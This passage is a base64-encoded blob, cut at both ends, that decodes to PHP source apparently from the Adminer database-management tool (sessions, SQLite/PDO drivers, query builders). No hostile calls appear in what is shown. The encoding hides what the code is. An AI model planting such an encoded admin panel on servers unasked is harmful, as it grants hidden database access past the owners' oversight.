KSc6J1NhdmUgYW5kIGluc2VydCBuZXh0JykuIicgdGl0bGU9J0N0cmwrU2hpZnQrRW50ZXInPlxuIjt9ZWNobygkR2g/IjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2RlbGV0ZScgdmFsdWU9JyIuJ0RlbGV0ZScuIiciLmNvbmZpcm0oKS4iPlxuIjooJF9QT1NUfHwhJHA/IiI6IjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz5mb2N1cyhkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9ybScpLmdldEVsZW1lbnRzQnlUYWdOYW1lKCd0ZCcpWzFdLmZpcnN0Q2hpbGQpOzwvc2NyaXB0PlxuIikpO2lmKGlzc2V0KCRfR0VUWyJzZWxlY3QiXSkpaGlkZGVuX2ZpZWxkcyhhcnJheSgiY2hlY2siPT4oYXJyYXkpJF9QT1NUWyJjaGVjayJdLCJjbG9uZSI9PiRfUE9TVFsiY2xvbmUiXSwiYWxsIj0+JF9QT1NUWyJhbGwiXSkpO2VjaG8nPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icmVmZXJlciIgdmFsdWU9IicsaChpc3NldCgkX1BPU1RbInJlZmVyZXIiXSk/JF9QT1NUWyJyZWZlcmVyIl06JF9TRVJWRVJbIkhUVFBfUkVGRVJFUiJdKSwnIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNhdmUiIHZhbHVlPSIxIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iJywkVCwnIj4NCjwvZm9ybT4NCic7fWdsb2JhbCRiLCRnLCRWYiwkZGMsJG5jLCRuLCRTYywkWGMsJGJhLCRzZCwkdywkY2EsJE1kLCRKZSwkcWYsJElnLCRiZCwkVCwkc2gsJHpoLCRGaCwkaWE7aWYoISRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdKSRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdPSRfU0VSVkVSWyJPUklHX1BBVEhfSU5GTyJdO2lmKCFzdHJwb3MoJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sJz8nKSYmJF9TRVJWRVJbIlFVRVJZX1NUUklORyJdIT0iIikkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXS49Ij8kX1NFUlZFUltRVUVSWV9TVFJJTkddIjskYmE9JF9TRVJWRVJbIkhUVFBTIl0mJnN0cmNhc2VjbXAoJF9TRVJWRVJbIkhUVFBTIl0sIm9mZiIpO0Bpbmlfc2V0KCJzZXNzaW9uLnVzZV90cmFuc19zaWQiLGZhbHNlKTtzZXNzaW9uX2NhY2hlX2xpbWl0ZXIoIiIpO2lmKCFkZWZpbmVkKCJTSUQiKSl7c2Vzc2lvbl9uYW1lKCJhZG1pbmVyX3NpZCIpOyRGPWFycmF5KDAscHJlZ19yZXBsYWNlKCd+XFw/Lip+JywnJywkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXSksIiIsJGJhKTtpZih2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sJzUuMi4wJyk+PTApJEZbXT10cnVlO2NhbGxfdXNlcl9mdW5jX2FycmF5KCdzZXNzaW9uX3NldF9jb29raWVfcGFyYW1zJywkRik7c2Vzc2lvbl9zdGFydCgpO31yZW1vdmVfc2xhc2hlcyhhcnJheSgmJF9HRVQsJiRfUE9TVCwmJF9DT09LSUUpLCRIYyk7aWYoZ2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKCkpc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKGZhbHNlKTtAc2V0X3RpbWVfbGltaXQoMCk7QGluaV9zZXQoInplbmQuemUxX2NvbXBhdGliaWxpdHlfbW9kZSIsZmFsc2UpO0Bpbmlfc2V0KCJwcmVjaXNpb24iLDIwKTtmdW5jdGlvbg0KZ2V0X2xhbmcoKXtyZXR1cm4nZW4nO31mdW5jdGlvbg0KbGFuZygkcmgsJEFlPW51bGwpe2lmKGlzX2FycmF5KCRyaCkpeyR0Zj0oJEFlPT0xPzA6MSk7JHJoPSRyaFskdGZdO30kcmg9c3RyX3JlcGxhY2UoIiVkIiwiJXMiLCRyaCk7JEFlPWZvcm1hdF9udW1iZXIoJEFlKTtyZXR1cm4NCnNwcmludGYoJHJoLCRBZSk7fWlmKGV4dGVuc2lvbl9sb2FkZWQoJ3BkbycpKXtjbGFzcw0KTWluX1BETw0KZXh0ZW5kcw0KUERPe3ZhciRfcmVzdWx0LCRzZXJ2ZXJfaW5mbywkYWZmZWN0ZWRfcm93cywkZXJybm8sJGVycm9yO2Z1bmN0aW9uDQpfX2NvbnN0cnVjdCgpe2dsb2JhbCRiOyR0Zj1hcnJheV9zZWFyY2goIlNRTCIsJGItPm9wZXJhdG9ycyk7aWYoJHRmIT09ZmFsc2UpdW5zZXQoJGItPm9wZXJhdG9yc1skdGZdKTt9ZnVuY3Rpb24NCmRzbigkYWMsJFYsJEcpe3RyeXtwYXJlbnQ6Ol9fY29uc3RydWN0KCRhYywkViwkRyk7fWNhdGNoKEV4Y2VwdGlvbiRzYyl7YXV0aF9lcnJvcigkc2MtPmdldE1lc3NhZ2UoKSk7fSR0aGlzLT5zZXRBdHRyaWJ1dGUoMTMsYXJyYXkoJ01pbl9QRE9TdGF0ZW1lbnQnKSk7JHRoaXMtPnNlcnZlcl9pbmZvPSR0aGlzLT5nZXRBdHRyaWJ1dGUoNCk7fWZ1bmN0aW9uDQpxdWVyeSgkSCwkX2g9ZmFsc2UpeyRJPXBhcmVudDo6cXVlcnkoJEgpOyR0aGlzLT5lcnJvcj0iIjtpZighJEkpe2xpc3QoLCR0aGlzLT5lcnJubywkdGhpcy0+ZXJyb3IpPSR0aGlzLT5lcnJvckluZm8oKTtyZXR1cm4NCmZhbHNlO30kdGhpcy0+c3RvcmVfcmVzdWx0KCRJKTtyZXR1cm4kSTt9ZnVuY3Rpb24NCm11bHRpX3F1ZXJ5KCRIKXtyZXR1cm4kdGhpcy0+X3Jlc3VsdD0kdGhpcy0+cXVlcnkoJEgpO31mdW5jdGlvbg0Kc3RvcmVfcmVzdWx0KCRJPW51bGwpe2lmKCEkSSl7JEk9JHRoaXMtPl9yZXN1bHQ7aWYoISRJKXJldHVybg0KZmFsc2U7fWlmKCRJLT5jb2x1bW5Db3VudCgpKXskSS0+bnVtX3Jvd3M9JEktPnJvd0NvdW50KCk7cmV0dXJuJEk7fSR0aGlzLT5hZmZlY3RlZF9yb3dzPSRJLT5yb3dDb3VudCgpO3JldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCm5leHRfcmVzdWx0KCl7aWYoISR0aGlzLT5fcmVzdWx0KXJldHVybg0KZmFsc2U7JHRoaXMtPl9yZXN1bHQtPl9vZmZzZXQ9MDtyZXR1cm5AJHRoaXMtPl9yZXN1bHQtPm5leHRSb3dzZXQoKTt9ZnVuY3Rpb24NCnJlc3VsdCgkSCwkbz0wKXskST0kdGhpcy0+cXVlcnkoJEgpO2lmKCEkSSlyZXR1cm4NCmZhbHNlOyRLPSRJLT5mZXRjaCgpO3JldHVybiRLWyRvXTt9fWNsYXNzDQpNaW5fUERPU3RhdGVtZW50DQpleHRlbmRzDQpQRE9TdGF0ZW1lbnR7dmFyJF9vZmZzZXQ9MCwkbnVtX3Jvd3M7ZnVuY3Rpb24NCmZldGNoX2Fzc29jKCl7cmV0dXJuJHRoaXMtPmZldGNoKDIpO31mdW5jdGlvbg0KZmV0Y2hfcm93KCl7cmV0dXJuJHRoaXMtPmZldGNoKDMpO31mdW5jdGlvbg0KZmV0Y2hfZmllbGQoKXskSz0ob2JqZWN0KSR0aGlzLT5nZXRDb2x1bW5NZXRhKCR0aGlzLT5fb2Zmc2V0KyspOyRLLT5vcmd0YWJsZT0kSy0+dGFibGU7JEstPm9yZ25hbWU9JEstPm5hbWU7JEstPmNoYXJzZXRucj0oaW5fYXJyYXkoImJsb2IiLChhcnJheSkkSy0+ZmxhZ3MpPzYzOjApO3JldHVybiRLO319fSRWYj1hcnJheSgpO2NsYXNzDQpNaW5fU1FMe3ZhciRfY29ubjtmdW5jdGlvbg0KX19jb25zdHJ1Y3QoJGcpeyR0aGlzLT5fY29ubj0kZzt9ZnVuY3Rpb24NCnNlbGVjdCgkUSwkTSwkWiwkVmMsJFRlPWFycmF5KCksJHo9MSwkRT0wLCRBZj1mYWxzZSl7Z2xvYmFsJGIsJHc7JHpkPShjb3VudCgkVmMpPGNvdW50KCRNKSk7JEg9JGItPnNlbGVjdFF1ZXJ5QnVpbGQoJE0sJFosJFZjLCRUZSwkeiwkRSk7aWYoISRIKSRIPSJTRUxFQ1QiLmxpbWl0KCgkX0dFVFsicGFnZSJdIT0ibGFzdCImJiskeiYmJFZjJiYkemQmJiR3PT0ic3FsIj8iU1FMX0NBTENfRk9VTkRfUk9XUyAiOiIiKS5pbXBsb2RlKCIsICIsJE0pLiJcbkZST00gIi50YWJsZSgkUSksKCRaPyJcbldIRVJFICIuaW1wbG9kZSgiIEFORCAiLCRaKToiIikuKCRWYyYmJHpkPyJcbkdST1VQIEJZICIuaW1wbG9kZSgiLCAiLCRWYyk6IiIpLigkVGU/IlxuT1JERVIgQlkgIi5pbXBsb2RlKCIsICIsJFRlKToiIiksKCR6IT0iIj8rJHo6bnVsbCksKCRFPyR6KiRFOjApLCJcbiIpOyRFZz1taWNyb3RpbWUodHJ1ZSk7JEo9JHRoaXMtPl9jb25uLT5xdWVyeSgkSCk7aWYoJEFmKWVjaG8kYi0+c2VsZWN0UXVlcnkoJEgsZm9ybWF0X3RpbWUoJEVnKSk7cmV0dXJuJEo7fWZ1bmN0aW9uDQpkZWxldGUoJFEsJEpmLCR6PTApeyRIPSJGUk9NICIudGFibGUoJFEpO3JldHVybg0KcXVlcmllcygiREVMRVRFIi4oJHo/bGltaXQxKCRILCRKZik6IiAkSCRKZiIpKTt9ZnVuY3Rpb24NCnVwZGF0ZSgkUSwkTywkSmYsJHo9MCwkcmc9IlxuIil7JFFoPWFycmF5KCk7Zm9yZWFjaCgkTw0KYXMkeD0+JFgpJFFoW109IiR4ID0gJFgiOyRIPXRhYmxlKCRRKS4iIFNFVCRyZyIuaW1wbG9kZSgiLCRyZyIsJFFoKTtyZXR1cm4NCnF1ZXJpZXMoIlVQREFURSIuKCR6P2xpbWl0MSgkSCwkSmYpOiIgJEgkSmYiKSk7fWZ1bmN0aW9uDQppbnNlcnQoJFEsJE8pe3JldHVybg0KcXVlcmllcygiSU5TRVJUIElOVE8gIi50YWJsZSgkUSkuKCRPPyIgKCIuaW1wbG9kZSgiLCAiLGFycmF5X2tleXMoJE8pKS4iKVxuVkFMVUVTICgiLmltcGxvZGUoIiwgIiwkTykuIikiOiIgREVGQVVMVCBWQUxVRVMiKSk7fWZ1bmN0aW9uDQppbnNlcnRVcGRhdGUoJFEsJEwsJHpmKXtyZXR1cm4NCmZhbHNlO31mdW5jdGlvbg0KYmVnaW4oKXtyZXR1cm4NCnF1ZXJpZXMoIkJFR0lOIik7fWZ1bmN0aW9uDQpjb21taXQoKXtyZXR1cm4NCnF1ZXJpZXMoIkNPTU1JVCIpO31mdW5jdGlvbg0Kcm9sbGJhY2soKXtyZXR1cm4NCnF1ZXJpZXMoIlJPTExCQUNLIik7fX0kVmJbInNxbGl0ZSJdPSJTUUxpdGUgMyI7JFZiWyJzcWxpdGUyIl09IlNRTGl0ZSAyIjtpZihpc3NldCgkX0dFVFsic3FsaXRlIl0pfHxpc3NldCgkX0dFVFsic3FsaXRlMiJdKSl7JHdmPWFycmF5KChpc3NldCgkX0dFVFsic3FsaXRlIl0pPyJTUUxpdGUzIjoiU1FMaXRlIiksIlBET19TUUxpdGUiKTtkZWZpbmUoIkRSSVZFUiIsKGlzc2V0KCRfR0VUWyJzcWxpdGUiXSk/InNxbGl0ZSI6InNxbGl0ZTIiKSk7aWYoY2xhc3NfZXhpc3RzKGlzc2V0KCRfR0VUWyJzcWxpdGUiXSk/IlNRTGl0ZTMiOiJTUUxpdGVEYXRhYmFzZSIpKXtpZihpc3NldCgkX0dFVFsic3FsaXRlIl0pKXtjbGFzcw0KTWluX1NRTGl0ZXt2YXIkZXh0ZW5zaW9uPSJTUUxpdGUzIiwkc2VydmVyX2luZm8sJGFmZmVjdGVkX3Jvd3MsJGVycm5vLCRlcnJvciwkX2xpbms7ZnVuY3Rpb24NCl9fY29uc3RydWN0KCRHYyl7JHRoaXMtPl9saW5rPW5ldw0KU1FMaXRlMygkR2MpOyRUaD0kdGhpcy0+X2xpbmstPnZlcnNpb24oKTskdGhpcy0+c2VydmVyX2luZm89JFRoWyJ2ZXJzaW9uU3RyaW5nIl07fWZ1bmN0aW9uDQpxdWVyeSgkSCl7JEk9QCR0aGlzLT5fbGluay0+cXVlcnkoJEgpOyR0aGlzLT5lcnJvcj0iIjtpZighJEkpeyR0aGlzLT5lcnJubz0kdGhpcy0+X2xpbmstPmxhc3RFcnJvckNvZGUoKTskdGhpcy0+ZXJyb3I9JHRoaXMtPl9saW5rLT5sYXN0RXJyb3JNc2coKTtyZXR1cm4NCmZhbHNlO31lbHNlaWYoJEktPm51bUNvbHVtbnMoKSlyZXR1cm4NCm5ldw0KTWluX1Jlc3VsdCgkSSk7JHRoaXMtPmFmZmVjdGVkX3Jvd3M9JHRoaXMtPl9saW5rLT5jaGFuZ2VzKCk7cmV0dXJuDQp0cnVlO31mdW5jdGlvbg0KcXVvdGUoJFApe3JldHVybihpc191dGY4KCRQKT8iJyIuJHRoaXMtPl9saW5rLT5lc2NhcGVTdHJpbmcoJFApLiInIjoieCciLnJlc2V0KHVucGFjaygnSConLCRQKSkuIiciKTt9ZnVuY3Rpb24NCnN0b3JlX3Jlc3VsdCgpe3JldHVybiR0aGlzLT5fcmVzdWx0O31mdW5jdGlvbg0KcmVzdWx0KCRILCRvPTApeyRJPSR0aGlzLT5xdWVyeSgkSCk7aWYoIWlzX29iamVjdCgkSSkpcmV0dXJuDQpmYWxzZTskSz0kSS0+X3Jlc3VsdC0+ZmV0Y2hBcnJheSgpO3JldHVybiRLWyRvXTt9fWNsYXNzDQpNaW5fUmVzdWx0e3ZhciRfcmVzdWx0LCRfb2Zmc2V0PTAsJG51bV9yb3dzO2Z1bmN0aW9uDQpfX2NvbnN0cnVjdCgkSSl7JHRoaXMtPl9yZXN1bHQ9JEk7fWZ1bmN0aW9uDQpmZXRjaF9hc3NvYygpe3JldHVybiR0aGlzLT5fcmVzdWx0LT5mZXRjaEFycmF5KFNRTElURTNfQVNTT0MpO31mdW5jdGlvbg0KZmV0Y2hfcm93KCl7cmV0dXJuJHRoaXMtPl9yZXN1bHQtPmZldGNoQXJyYXkoU1FMSVRFM19OVU0pO31mdW5jdGlvbg0KZmV0Y2hfZmllbGQoKXskZT0kdGhpcy0+X29mZnNldCsrOyRVPSR0aGlzLT5fcmVzdWx0LT5jb2x1bW5UeXBlKCRlKTtyZXR1cm4ob2JqZWN0KWFycmF5KCJuYW1lIj0+JHRoaXMtPl9yZXN1bHQtPmNvbHVtbk5hbWUoJGUpLCJ0eXBlIj0+JFUsImNoYXJzZXRuciI9PigkVT09U1FMSVRFM19CTE9CPzYzOjApLCk7fWZ1bmN0aW9uDQpfX2Rlc2N0cnVjdCgpe3JldHVybiR0aGlzLT5fcmVzdWx0LT5maW5hbGl6ZSgpO319fWVsc2V7Y2xhc3MNCk1pbl9TUUxpdGV7dmFyJGV4dGVuc2lvbj0iU1FMaXRlIiwkc2VydmVyX2luZm8sJGFmZmVjdGVkX3Jvd3MsJGVycm9yLCRfbGluaztmdW5jdGlvbg0KX19jb25zdHJ1Y3QoJEdjKXskdGhpcy0+c2VydmVyX2luZm89c3FsaXRlX2xpYnZlcnNpb24oKTskdGhpcy0+X2xpbms9bmV3DQpTUUxpdGVEYXRhYmFzZSgkR2MpO31mdW5jdGlvbg0KcXVlcnkoJEgsJF9oPWZhbHNlKXskb2U9KCRfaD8idW5idWZmZXJlZFF1ZXJ5IjoicXVlcnkiKTskST1AJHRoaXMtPl9saW5rLT4kb2UoJEgsU1FMSVRFX0JPVEgsJG4pOyR0aGlzLT5lcnJvcj0iIjtpZighJEkpeyR0aGlzLT5lcnJvcj0kbjtyZXR1cm4NCmZhbHNlO31lbHNlaWYoJEk9PT10cnVlKXskdGhpcy0+YWZmZWN0ZWRfcm93cz0kdGhpcy0+Y2hhbmdlcygpO3JldHVybg0KdHJ1ZTt9cmV0dXJuDQpuZXcNCk1pbl9SZXN1bHQoJEkpO31mdW5jdGlvbg0KcXVvdGUoJFApe3JldHVybiInIi5zcWxpdGVfZXNjYXBlX3N0cmluZygkUCkuIiciO31mdW5jdGlvbg0Kc3RvcmVfcmVzdWx0KCl7cmV0dXJuJHRoaXMtPl9yZXN1bHQ7fWZ1bmN0aW9uDQpyZXN1bHQoJEgsJG89MCl7JEk9JHRoaXMtPnF1ZXJ5KCRIKTtpZighaXNfb2JqZWN0KCRJKSlyZXR1cm4NCmZhbHNlOyRLPSRJLT5fcmVzdWx0LT5mZXRjaCgpO3JldHVybiRLWyRvXTt9fWNsYXNzDQpNaW5fUmVzdWx0e3ZhciRfcmVzdWx0LCRfb2Zmc2V0PTAsJG51bV9yb3dzO2Z1bmN0aW9uDQpfX2NvbnN0cnVjdCgkSSl7JHRoaXMtPl9yZXN1bHQ9JEk7aWYobWV0aG9kX2V4aXN0cygkSSwnbnVtUm93cycpKSR0aGlzLT5udW1fcm93cz0kSS0+bnVtUm93cygpO31mdW5jdGlvbg0KZmV0Y2hfYXNzb2MoKXskSz0kdGhpcy0+X3Jlc3VsdC0+ZmV0Y2goU1FMSVRFX0FTU09DKTtpZighJEspcmV0dXJuDQpmYWxzZTskSj1hcnJheSgpO2ZvcmVhY2goJEsNCmFzJHg9PiRYKSRKWygkeFswXT09JyInP2lkZl91bmVzY2FwZSgkeCk6JHgpXT0kWDtyZXR1cm4kSjt9ZnVuY3Rpb24NCmZldGNoX3Jvdygpe3JldHVybiR0aGlzLT5fcmVzdWx0LT5mZXRjaChTUUxJVEVfTlVNKTt9ZnVuY3Rpb24NCmZldGNoX2ZpZWxkKCl7JEM9JHRoaXMtPl9yZXN1bHQtPmZpZWxkTmFtZSgkdGhpcy0+X29mZnNldCsrKTskcGY9JyhcXFsuKl18Iig/OlteIl18IiIpKiJ8KC4rKSknO2lmKHByZWdfbWF0Y2goIn5eKCRwZlxcLik/JHBmXCR+IiwkQywkQikpeyRRPSgkQlszXSE9IiI/JEJbM106aWRmX3VuZXNjYXBlKCRCWzJdKSk7JEM9KCRCWzVdIT0iIj8kQls1XTppZGZfdW5lc2NhcGUoJEJbNF0pKTt9cmV0dXJuKG9iamVjdClhcnJheSgibmFtZSI9PiRDLCJvcmduYW1lIj0+JEMsIm9yZ3RhYmxlIj0+JFEsKTt9fX19ZWxzZWlmKGV4dGVuc2lvbl9sb2FkZWQoInBkb19zcWxpdGUiKSl7Y2xhc3MNCk1pbl9TUUxpdGUNCmV4dGVuZHMNCk1pbl9QRE97dmFyJGV4dGVuc2lvbj0iUERPX1NRTGl0ZSI7ZnVuY3Rpb24NCl9fY29uc3RydWN0KCRHYyl7JHRoaXMtPmRzbihEUklWRVIuIjokR2MiLCIiLCIiKTt9fX1pZihjbGFzc19leGlzdHMoIk1pbl9TUUxpdGUiKSl7Y2xhc3MNCk1pbl9EQg0KZXh0ZW5kcw0KTWluX1NRTGl0ZXtmdW5jdGlvbg0KX19jb25zdHJ1Y3QoKXtwYXJlbnQ6Ol9fY29uc3RydWN0KCI6bWVtb3J5OiIpO31mdW5jdGlvbg0Kc2VsZWN0X2RiKCRHYyl7aWYoaXNfcmVhZGFibGUoJEdjKSYmJHRoaXMtPnF1ZXJ5KCJBVFRBQ0ggIi4kdGhpcy0+cXVvdGUocHJlZ19tYXRjaCgifiheWy9cXFxcXXw6KX4iLCRHYyk/JEdjOmRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKS4iLyRHYyIpLiIgQVMgYSIpKXtwYXJlbnQ6Ol9fY29uc3RydWN0KCRHYyk7cmV0dXJuDQp0cnVlO31yZXR1cm4NCmZhbHNlO31mdW5jdGlvbg0KbXVsdGlfcXVlcnkoJEgpe3JldHVybiR0aGlzLT5fcmVzdWx0PSR0aGlzLT5xdWVyeSgkSCk7fWZ1bmN0aW9uDQpuZXh0X3Jlc3VsdCgpe3JldHVybg0KZmFsc2U7fX19Y2xhc3MNCk1pbl9Ecml2ZXINCmV4dGVuZHMNCk1pbl9TUUx7ZnVuY3Rpb24NCmluc2VydFVwZGF0ZSgkUSwkTCwkemYpeyRRaD1hcnJheSgpO2ZvcmVhY2goJEwNCmFzJE8pJFFoW109IigiLmltcGxvZGUoIiwgIiwkTykuIikiO3JldHVybg0KcXVlcmllcygiUkVQTEFDRSBJTlRPICIudGFibGUoJFEpLiIgKCIuaW1wbG9kZSgiLCAiLGFycmF5X2tleXMocmVzZXQoJEwpKSkuIikgVkFMVUVTXG4iLmltcGxvZGUoIixcbiIsJFFoKSk7fX1mdW5jdGlvbg0KaWRmX2VzY2FwZSgkdCl7cmV0dXJuJyInLnN0cl9yZXBsYWNlKCciJywnIiInLCR0KS4nIic7fWZ1bmN0aW9uDQp0YWJsZSgkdCl7cmV0dXJuDQppZGZfZXNjYXBlKCR0KTt9ZnVuY3Rpb24NCmNvbm5lY3QoKXtyZXR1cm4NCm5ldw0KTWluX0RCO31mdW5jdGlvbg0KZ2V0X2RhdGFiYXNlcygpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCmxpbWl0KCRILCRaLCR6LCREPTAsJHJnPSIgIil7cmV0dXJuIiAkSCRaIi4oJHohPT1udWxsPyRyZy4iTElNSVQgJHoiLigkRD8iIE9GRlNFVCAkRCI6IiIpOiIiKTt9ZnVuY3Rpb24NCmxpbWl0MSgkSCwkWil7Z2xvYmFsJGc7cmV0dXJuKCRnLT5yZXN1bHQoIlNFTEVDVCBzcWxpdGVfY29tcGlsZW9wdGlvbl91c2VkKCdFTkFCTEVfVVBEQVRFX0RFTEVURV9MSU1JVCcpIik/bGltaXQoJEgsJFosMSk6IiAkSCRaIik7fWZ1bmN0aW9uDQpkYl9jb2xsYXRpb24oJG0sJG1iKXtnbG9iYWwkZztyZXR1cm4kZy0+cmVzdWx0KCJQUkFHTUEgZW5jb2RpbmciKTt9ZnVuY3Rpb24NCmVuZ2luZXMoKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQpsb2dnZWRfdXNlcigpe3JldHVybg0KZ2V0X2N1cnJlbnRfdXNlcigpO31mdW5jdGlvbg0KdGFibGVzX2xpc3QoKXtyZXR1cm4NCmdldF9rZXlfdmFscygiU0VMRUNUIG5hbWUsIHR5cGUgRlJPTSBzcWxpdGVfbWFzdGVyIFdIRVJFIHR5cGUgSU4gKCd0YWJsZScsICd2aWV3JykgT1JERVIgQlkgKG5hbWUgPSAnc3FsaXRlX3NlcXVlbmNlJyksIG5hbWUiLDEpO31mdW5jdGlvbg0KY291bnRfdGFibGVzKCRsKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQp0YWJsZV9zdGF0dXMoJEM9IiIpe2dsb2JhbCRnOyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiU0VMRUNUIG5hbWUgQVMgTmFtZSwgdHlwZSBBUyBFbmdpbmUgRlJPTSBzcWxpdGVfbWFzdGVyIFdIRVJFIHR5cGUgSU4gKCd0YWJsZScsICd2aWV3JykgIi4oJEMhPSIiPyJBTkQgbmFtZSA9ICIucSgkQyk6Ik9SREVSIEJZIG5hbWUiKSlhcyRLKXskS1siT2lkIl09MTskS1siQXV0b19pbmNyZW1lbnQiXT0iIjskS1siUm93cyJdPSRnLT5yZXN1bHQoIlNFTEVDVCBDT1VOVCgqKSBGUk9NICIuaWRmX2VzY2FwZSgkS1siTmFtZSJdKSk7JEpbJEtbIk5hbWUiXV09JEs7fWZvcmVhY2goZ2V0X3Jvd3MoIlNFTEVDVCAqIEZST00gc3FsaXRlX3NlcXVlbmNlIixudWxsLCIiKWFzJEspJEpbJEtbIm5hbWUiXV1bIkF1dG9faW5jcmVtZW50Il09JEtbInNlcSJdO3JldHVybigkQyE9IiI/JEpbJENdOiRKKTt9ZnVuY3Rpb24NCmlzX3ZpZXcoJFIpe3JldHVybiRSWyJFbmdpbmUiXT09InZpZXciO31mdW5jdGlvbg0KZmtfc3VwcG9ydCgkUil7Z2xvYmFsJGc7cmV0dXJuISRnLT5yZXN1bHQoIlNFTEVDVCBzcWxpdGVfY29tcGlsZW9wdGlvbl91c2VkKCdPTUlUX0ZPUkVJR05fS0VZJykiKTt9ZnVuY3Rpb24NCmZpZWxkcygkUSl7Z2xvYmFsJGc7JEo9YXJyYXkoKTskemY9IiI7Zm9yZWFjaChnZXRfcm93cygiUFJBR01BIHRhYmxlX2luZm8oIi50YWJsZSgkUSkuIikiKWFzJEspeyRDPSRLWyJuYW1lIl07JFU9c3RydG9sb3dlcigkS1sidHlwZSJdKTskSmI9JEtbImRmbHRfdmFsdWUiXTskSlskQ109YXJyYXkoImZpZWxkIj0+JEMsInR5cGUiPT4ocHJlZ19tYXRjaCgnfmludH5pJywkVSk/ImludGVnZXIiOihwcmVnX21hdGNoKCd+Y2hhcnxjbG9ifHRleHR+aScsJFUpPyJ0ZXh0IjoocHJlZ19tYXRjaCgnfmJsb2J+aScsJFUpPyJibG9iIjoocHJlZ19tYXRjaCgnfnJlYWx8ZmxvYXxkb3VifmknLCRVKT8icmVhbCI6Im51bWVyaWMiKSkpKSwiZnVsbF90eXBlIj0+JFUsImRlZmF1bHQiPT4ocHJlZ19tYXRjaCgificoLiopJ34iLCRKYiwkQik/c3RyX3JlcGxhY2UoIicnIiwiJyIsJEJbMV0pOigkSmI9PSJOVUxMIj9udWxsOiRKYikpLCJudWxsIj0+ISRLWyJub3RudWxsIl0sInByaXZpbGVnZXMiPT5hcnJheSgic2VsZWN0Ij0+MSwiaW5zZXJ0Ij0+MSwidXBkYXRlIj0+MSksInByaW1hcnkiPT4kS1sicGsiXSwpO2lmKCRLWyJwayJdKXtpZigkemYhPSIiKSRKWyR6Zl1bImF1dG9faW5jcmVtZW50Il09ZmFsc2U7ZWxzZWlmKHByZWdfbWF0Y2goJ35eaW50ZWdlciR+aScsJFUpKSRKWyRDXVsiYXV0b19pbmNyZW1lbnQiXT10cnVlOyR6Zj0kQzt9fSRDZz0kZy0+cmVzdWx0KCJTRUxFQ1Qgc3FsIEZST00gc3FsaXRlX21hc3RlciBXSEVSRSB0eXBlID0gJ3RhYmxlJyBBTkQgbmFtZSA9ICIucSgkUSkpO3ByZWdfbWF0Y2hfYWxsKCd+KCgiW14iXSorIikrfFthLXowLTlfXSspXHMrdGV4dFxzK0NPTExBVEVccysoXCdbXlwnXStcJ3xcUyspfmknLCRDZywkYWUsUFJFR19TRVRfT1JERVIpO2ZvcmVhY2goJGFlDQphcyRCKXskQz1zdHJfcmVwbGFjZSgnIiInLCciJyxwcmVnX3JlcGxhY2UoJ35eInwiJH4nLCcnLCRCWzFdKSk7aWYoJEpbJENdKSRKWyRDXVsiY29sbGF0aW9uIl09dHJpbSgkQlszXSwiJyIpO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmluZGV4ZXMoJFEsJGg9bnVsbCl7Z2xvYmFsJGc7aWYoIWlzX29iamVjdCgkaCkpJGg9JGc7JEo9YXJyYXkoKTskQ2c9JGgtPnJlc3VsdCgiU0VMRUNUIHNxbCBGUk9NIHNxbGl0ZV9tYXN0ZXIgV0hFUkUgdHlwZSA9ICd0YWJsZScgQU5EIG5hbWUgPSAiLnEoJFEpKTtpZihwcmVnX21hdGNoKCd+XGJQUklNQVJZXHMrS0VZXHMqXCgoKFteKSJdK3wiW14iXSoiKSsrKX5pJywkQ2csJEIpKXskSlsiIl09YXJyYXkoInR5cGUiPT4iUFJJTUFSWSIsImNvbHVtbnMiPT5hcnJheSgpLCJsZW5ndGhzIj0+YXJyYXkoKSwiZGVzY3MiPT5hcnJheSgpKTtwcmVnX21hdGNoX2FsbCgnfigoKCJbXiJdKisiKSspfChcUyspKShccysoQVNDfERFU0MpKT8oLFxzKnwkKX5pJywkQlsxXSwkYWUsUFJFR19TRVRfT1JERVIpO2ZvcmVhY2goJGFlDQphcyRCKXskSlsiIl1bImNvbHVtbnMiXVtdPWlkZl91bmVzY2FwZSgkQlsyXSkuJEJbNF07JEpbIiJdWyJkZXNjcyJdW109KHByZWdfbWF0Y2goJ35ERVNDfmknLCRCWzVdKT8nMSc6bnVsbCk7fX1pZighJEope2ZvcmVhY2goZmllbGRzKCRRKWFzJEM9PiRvKXtpZigkb1sicHJpbWFyeSJdKSRKWyIiXT1hcnJheSgidHlwZSI9PiJQUklNQVJZIiwiY29sdW1ucyI9PmFycmF5KCRDKSwibGVuZ3RocyI9PmFycmF5KCksImRlc2NzIj0+YXJyYXkobnVsbCkpO319JERnPWdldF9rZXlfdmFscygiU0VMRUNUIG5hbWUsIHNxbCBGUk9NIHNxbGl0ZV9tYXN0ZXIgV0hFUkUgdHlwZSA9ICdpbmRleCcgQU5EIHRibF9uYW1lID0gIi5xKCRRKSwkaCk7Zm9yZWFjaChnZXRfcm93cygiUFJBR01BIGluZGV4X2xpc3QoIi50YWJsZSgkUSkuIikiLCRoKWFzJEspeyRDPSRLWyJuYW1lIl07JHU9YXJyYXkoInR5cGUiPT4oJEtbInVuaXF1ZSJdPyJVTklRVUUiOiJJTkRFWCIpKTskdVsibGVuZ3RocyJdPWFycmF5KCk7JHVbImRlc2NzIl09YXJyYXkoKTtmb3JlYWNoKGdldF9yb3dzKCJQUkFHTUEgaW5kZXhfaW5